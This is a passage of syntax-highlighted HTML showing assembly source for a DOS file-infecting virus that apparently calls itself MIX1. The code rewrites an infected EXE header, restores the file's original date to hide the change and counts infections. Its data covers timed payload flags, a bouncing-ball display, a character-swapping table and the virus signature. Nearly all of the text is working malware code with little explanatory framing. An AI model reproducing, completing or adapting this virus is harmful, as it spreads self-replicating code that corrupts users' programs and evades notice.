        </span><span class="sc6">RCR</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">10H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">1EH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Modify length mod 512</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">],</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">        </span><span class="sc5">L14</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_HI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">L14</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">511</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">0AH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Modify number of blocks used</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_HI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">511</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">        </span><span class="sc5">L14A</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">L14A</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">0CH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Finally the modified header is written back to the start of the</span><span class="sc0">
</span><span class="sc1">;        file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">QQQ</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; was XOR CX,CX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">CONST0</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; was XOR DX,DX</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">        </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">        </span><span class="sc5">ENDIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1CH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">        </span><span class="sc2">21H</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This part is new:       Restore old date.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DATE1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DATE2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5701H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">ENDIT</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">NOINF</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Infection is finished - close the file and execute it</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ENDIT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0">        </span><span class="sc5">L9</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc5">VIDEOT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">07D0H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0B800H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">07D0H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0B800H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0FA0H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0B800H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0FA0H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0B800H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0001H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">4000H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0B800H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0001H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">4000H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0B800H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0001H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">4000H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0B800H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0FA0H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0B000H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0001H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">3E80H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0B000H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0001H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7D00H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0B000H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0001H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7D00H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0B000H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0002H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0000H</span><span class="sc4">,</span><span class="sc0">   </span><span class="sc2">0000H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0002H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0000H</span><span class="sc4">,</span><span class="sc0">   </span><span class="sc2">0000H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0001H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7D00H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0A000H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0001H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0FA00H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A000H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0001H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">6D60H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0A000H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0002H</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0000H.</span><span class="sc0">  </span><span class="sc2">0000H</span><span class="sc0">
 
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc5">ERRTAB</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">00H</span><span class="sc4">,</span><span class="sc2">01H</span><span class="sc4">,</span><span class="sc2">02H</span><span class="sc4">,</span><span class="sc2">03H</span><span class="sc4">,</span><span class="sc2">04H</span><span class="sc4">,</span><span class="sc2">05H</span><span class="sc4">,</span><span class="sc2">06H</span><span class="sc4">,</span><span class="sc2">07H</span><span class="sc4">,</span><span class="sc2">08H</span><span class="sc4">,</span><span class="sc2">09H</span><span class="sc4">,</span><span class="sc2">0BH</span><span class="sc4">,</span><span class="sc2">0AH</span><span class="sc4">,</span><span class="sc2">0CH</span><span class="sc4">,</span><span class="sc2">0DH</span><span class="sc4">,</span><span class="sc2">0EH</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">10H</span><span class="sc4">,</span><span class="sc2">11H</span><span class="sc4">,</span><span class="sc2">12H</span><span class="sc4">,</span><span class="sc2">13H</span><span class="sc4">,</span><span class="sc2">14H</span><span class="sc4">,</span><span class="sc2">15H</span><span class="sc4">,</span><span class="sc2">16H</span><span class="sc4">,</span><span class="sc2">17H</span><span class="sc4">,</span><span class="sc2">18H</span><span class="sc4">,</span><span class="sc2">19H</span><span class="sc4">,</span><span class="sc2">1BH</span><span class="sc4">,</span><span class="sc2">1AH</span><span class="sc4">,</span><span class="sc2">1CH</span><span class="sc4">,</span><span class="sc2">1DH</span><span class="sc4">,</span><span class="sc2">1FH</span><span class="sc4">,</span><span class="sc2">1EH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">20H</span><span class="sc4">,</span><span class="sc2">21H</span><span class="sc4">,</span><span class="sc2">22H</span><span class="sc4">,</span><span class="sc2">23H</span><span class="sc4">,</span><span class="sc2">24H</span><span class="sc4">,</span><span class="sc2">25H</span><span class="sc4">,</span><span class="sc2">26H</span><span class="sc4">,</span><span class="sc2">27H</span><span class="sc4">,</span><span class="sc2">29H</span><span class="sc4">,</span><span class="sc2">28H</span><span class="sc4">,</span><span class="sc2">2AH</span><span class="sc4">,</span><span class="sc2">2DH</span><span class="sc4">,</span><span class="sc2">2CH</span><span class="sc4">,</span><span class="sc2">2BH</span><span class="sc4">,</span><span class="sc2">2EH</span><span class="sc4">,</span><span class="sc2">2FH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">30H</span><span class="sc4">,</span><span class="sc2">31H</span><span class="sc4">,</span><span class="sc2">32H</span><span class="sc4">,</span><span class="sc2">33H</span><span class="sc4">,</span><span class="sc2">34H</span><span class="sc4">,</span><span class="sc2">35H</span><span class="sc4">,</span><span class="sc2">36H</span><span class="sc4">,</span><span class="sc2">37H</span><span class="sc4">,</span><span class="sc2">38H</span><span class="sc4">,</span><span class="sc2">39H</span><span class="sc4">,</span><span class="sc2">3AH</span><span class="sc4">,</span><span class="sc2">3BH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc4">,</span><span class="sc2">3DH</span><span class="sc4">,</span><span class="sc2">3CH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">40H</span><span class="sc4">,</span><span class="sc2">42H</span><span class="sc4">,</span><span class="sc2">45H</span><span class="sc4">,</span><span class="sc2">43H</span><span class="sc4">,</span><span class="sc2">44H</span><span class="sc4">,</span><span class="sc2">41H</span><span class="sc4">,</span><span class="sc2">50H</span><span class="sc4">,</span><span class="sc2">47H</span><span class="sc4">,</span><span class="sc2">48H</span><span class="sc4">,</span><span class="sc2">59H</span><span class="sc4">,</span><span class="sc2">4AH</span><span class="sc4">,</span><span class="sc2">4BH</span><span class="sc4">,</span><span class="sc2">4CH</span><span class="sc4">,</span><span class="sc2">4DH</span><span class="sc4">,</span><span class="sc2">4EH</span><span class="sc4">,</span><span class="sc2">55H</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">46H</span><span class="sc4">,</span><span class="sc2">51H</span><span class="sc4">,</span><span class="sc2">52H</span><span class="sc4">,</span><span class="sc2">53H</span><span class="sc4">,</span><span class="sc2">54H</span><span class="sc4">,</span><span class="sc2">4FH</span><span class="sc4">,</span><span class="sc2">56H</span><span class="sc4">,</span><span class="sc2">57H</span><span class="sc4">,</span><span class="sc2">58H</span><span class="sc4">,</span><span class="sc2">49H</span><span class="sc4">,</span><span class="sc2">5AH</span><span class="sc4">,</span><span class="sc2">5DH</span><span class="sc4">,</span><span class="sc2">5CH</span><span class="sc4">,</span><span class="sc2">5BH</span><span class="sc4">,</span><span class="sc2">5EH</span><span class="sc4">,</span><span class="sc2">5FH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">60H</span><span class="sc4">,</span><span class="sc2">65H</span><span class="sc4">,</span><span class="sc2">62H</span><span class="sc4">,</span><span class="sc2">73H</span><span class="sc4">,</span><span class="sc2">64H</span><span class="sc4">,</span><span class="sc2">61H</span><span class="sc4">,</span><span class="sc2">70H</span><span class="sc4">,</span><span class="sc2">67H</span><span class="sc4">,</span><span class="sc2">68H</span><span class="sc4">,</span><span class="sc2">65H</span><span class="sc4">,</span><span class="sc2">6AH</span><span class="sc4">,</span><span class="sc2">6BH</span><span class="sc4">,</span><span class="sc2">6CH</span><span class="sc4">,</span><span class="sc2">6DH</span><span class="sc4">,</span><span class="sc2">6EH</span><span class="sc4">,</span><span class="sc2">75H</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">66H</span><span class="sc4">,</span><span class="sc2">71H</span><span class="sc4">,</span><span class="sc2">72H</span><span class="sc4">,</span><span class="sc2">63H</span><span class="sc4">,</span><span class="sc2">74H</span><span class="sc4">,</span><span class="sc2">6FH</span><span class="sc4">,</span><span class="sc2">76H</span><span class="sc4">,</span><span class="sc2">77H</span><span class="sc4">,</span><span class="sc2">78H</span><span class="sc4">,</span><span class="sc2">79H</span><span class="sc4">,</span><span class="sc2">7AH</span><span class="sc4">,</span><span class="sc2">7DH</span><span class="sc4">,</span><span class="sc2">7CH</span><span class="sc4">,</span><span class="sc2">7BH</span><span class="sc4">,</span><span class="sc2">7EH</span><span class="sc4">,</span><span class="sc2">7FH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">92H</span><span class="sc4">,</span><span class="sc2">81H</span><span class="sc4">,</span><span class="sc2">82H</span><span class="sc4">,</span><span class="sc2">83H</span><span class="sc4">,</span><span class="sc2">84H</span><span class="sc4">,</span><span class="sc2">85H</span><span class="sc4">,</span><span class="sc2">86H</span><span class="sc4">,</span><span class="sc2">8BH</span><span class="sc4">,</span><span class="sc2">9AH</span><span class="sc4">,</span><span class="sc2">89H</span><span class="sc4">,</span><span class="sc2">8AH</span><span class="sc4">,</span><span class="sc2">87H</span><span class="sc4">,</span><span class="sc2">8CH</span><span class="sc4">,</span><span class="sc2">8DH</span><span class="sc4">,</span><span class="sc2">8EH</span><span class="sc4">,</span><span class="sc2">8FH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">90H</span><span class="sc4">,</span><span class="sc2">99H</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc4">,</span><span class="sc2">93H</span><span class="sc4">,</span><span class="sc2">94H</span><span class="sc4">,</span><span class="sc2">95H</span><span class="sc4">,</span><span class="sc2">96H</span><span class="sc4">,</span><span class="sc2">97H</span><span class="sc4">,</span><span class="sc2">98H</span><span class="sc4">,</span><span class="sc2">91H</span><span class="sc4">,</span><span class="sc2">88H</span><span class="sc4">,</span><span class="sc2">9BH</span><span class="sc4">,</span><span class="sc2">9CH</span><span class="sc4">,</span><span class="sc2">9DH</span><span class="sc4">,</span><span class="sc2">9EH</span><span class="sc4">,</span><span class="sc2">9FH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0A0H</span><span class="sc4">,</span><span class="sc2">0A1H</span><span class="sc4">,</span><span class="sc2">0A2H</span><span class="sc4">,</span><span class="sc2">0A3H</span><span class="sc4">,</span><span class="sc2">0A4H</span><span class="sc4">,</span><span class="sc2">0A5H</span><span class="sc4">,</span><span class="sc2">0A6H</span><span class="sc4">,</span><span class="sc2">0A7H</span><span class="sc4">,</span><span class="sc2">0A8H</span><span class="sc4">,</span><span class="sc2">0A9H</span><span class="sc4">,</span><span class="sc2">0BBH</span><span class="sc4">,</span><span class="sc2">0ABH</span><span class="sc4">,</span><span class="sc2">0ACH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0B0H</span><span class="sc4">,</span><span class="sc2">0B1H</span><span class="sc4">,</span><span class="sc2">0B2H</span><span class="sc4">,</span><span class="sc2">0B3H</span><span class="sc4">,</span><span class="sc2">0B4H</span><span class="sc4">,</span><span class="sc2">0B5H</span><span class="sc4">,</span><span class="sc2">0B6H</span><span class="sc4">,</span><span class="sc2">0B7H</span><span class="sc4">,</span><span class="sc2">0B8H</span><span class="sc4">,</span><span class="sc2">0B9H</span><span class="sc4">,</span><span class="sc2">0BAH</span><span class="sc4">,</span><span class="sc2">0AAH</span><span class="sc4">,</span><span class="sc2">0D9H</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0C8H</span><span class="sc4">,</span><span class="sc2">0C1H</span><span class="sc4">,</span><span class="sc2">0C2H</span><span class="sc4">,</span><span class="sc2">0C3H</span><span class="sc4">,</span><span class="sc2">0C4H</span><span class="sc4">,</span><span class="sc2">0C5H</span><span class="sc4">,</span><span class="sc2">0C6H</span><span class="sc4">,</span><span class="sc2">0C7H</span><span class="sc4">,</span><span class="sc2">0C0H</span><span class="sc4">,</span><span class="sc2">0A9H</span><span class="sc4">,</span><span class="sc2">0CAH</span><span class="sc4">,</span><span class="sc2">0CBH</span><span class="sc4">,</span><span class="sc2">0CCH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0D0H</span><span class="sc4">,</span><span class="sc2">0D1H</span><span class="sc4">,</span><span class="sc2">0D2H</span><span class="sc4">,</span><span class="sc2">0D3H</span><span class="sc4">,</span><span class="sc2">0D4H</span><span class="sc4">,</span><span class="sc2">0D5H</span><span class="sc4">,</span><span class="sc2">0D6H</span><span class="sc4">,</span><span class="sc2">0D7H</span><span class="sc4">,</span><span class="sc2">0D8H</span><span class="sc4">,</span><span class="sc2">0BCH</span><span class="sc4">,</span><span class="sc2">0DAH</span><span class="sc4">,</span><span class="sc2">0DBH</span><span class="sc4">,</span><span class="sc2">0DCH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E0H</span><span class="sc4">,</span><span class="sc2">0E1H</span><span class="sc4">,</span><span class="sc2">0E2H</span><span class="sc4">,</span><span class="sc2">0E3H</span><span class="sc4">,</span><span class="sc2">0E4H</span><span class="sc4">,</span><span class="sc2">0E5H</span><span class="sc4">,</span><span class="sc2">0E6H</span><span class="sc4">,</span><span class="sc2">0E7H</span><span class="sc4">,</span><span class="sc2">0E8H</span><span class="sc4">,</span><span class="sc2">0E9H</span><span class="sc4">,</span><span class="sc2">0EAH</span><span class="sc4">,</span><span class="sc2">0EBH</span><span class="sc4">,</span><span class="sc2">0ECH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0F0H</span><span class="sc4">,</span><span class="sc2">0F1H</span><span class="sc4">,</span><span class="sc2">0F2H</span><span class="sc4">,</span><span class="sc2">0F3H</span><span class="sc4">,</span><span class="sc2">0F4H</span><span class="sc4">,</span><span class="sc2">0F5H</span><span class="sc4">,</span><span class="sc2">0F6H</span><span class="sc4">,</span><span class="sc2">0F7H</span><span class="sc4">,</span><span class="sc2">0F8H</span><span class="sc4">,</span><span class="sc2">0F9H</span><span class="sc4">,</span><span class="sc2">0FAH</span><span class="sc4">,</span><span class="sc2">0FBH</span><span class="sc4">,</span><span class="sc2">0FCH</span><span class="sc0">
 
</span><span class="sc5">CONST1</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Just the constant 1</span><span class="sc0">
</span><span class="sc5">CONST0</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; The label says it all</span><span class="sc0">
</span><span class="sc5">MIN60</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Flag, set to 1 60 minutes after execution</span><span class="sc0">
</span><span class="sc5">MIN50</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Flag, set to 1 50 minutes after execution</span><span class="sc0">
</span><span class="sc5">VMODE</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Video mode</span><span class="sc0">
</span><span class="sc5">MAXLIN</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">24</span><span class="sc0">
</span><span class="sc5">MYCOL</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Position of ball on screen</span><span class="sc0">
</span><span class="sc5">MYLINE</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; ditto.</span><span class="sc0">
</span><span class="sc5">ONSCREEN</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; Previous character on the screen</span><span class="sc0">
</span><span class="sc5">UPDOWN</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Direction of ball (up or down)</span><span class="sc0">
</span><span class="sc5">LEFTRIGHT</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Direction (left or right)</span><span class="sc0">
</span><span class="sc5">SCRCOL</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SCRLINE</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DATE1</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; Date of file</span><span class="sc0">
</span><span class="sc5">DATE2</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; ditto.</span><span class="sc0">
</span><span class="sc5">TIMER</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Number of timer (INT 8) ticks</span><span class="sc0">
</span><span class="sc5">LEN_LO</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LEN_HI</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">NOINF</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Number of infections</span><span class="sc0">
</span><span class="sc5">ID</span><span class="sc0">      </span><span class="sc5">ABRAX</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"MIX1"</span><span class="sc0">  </span><span class="sc1">; The signature of the virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        A buffer, used for data from the file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
 
</span><span class="sc5">VIRUS</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc5">CODE</span><span class="sc0">        </span><span class="sc9">ENDS</span><span class="sc0">
 
        </span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">ABRAX</span><span class="sc0">
</span></div></body>
</html>
